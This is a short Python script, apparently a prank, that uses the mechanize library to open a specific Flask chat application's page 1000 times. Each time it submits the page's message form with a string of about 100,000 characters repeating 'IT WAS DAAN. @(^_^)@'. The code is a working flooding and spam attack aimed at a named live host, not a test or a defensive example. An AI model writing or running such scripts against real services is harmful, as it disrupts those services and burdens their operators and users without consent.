import mechanize

text_list = []
for i in range(5000):
    i = 'IT WAS DAAN. @(^_^)@'
    text_list.append(i)
text = "".join(text_list)

for i in range(1000): 
    br = mechanize.Browser()
    br.open("http://flaskchat-leiden-richardadalton.c9users.io:8080/chat/HIHI")
    br.select_form(nr=0)
    br.form['message'] = text
    req = br.submit()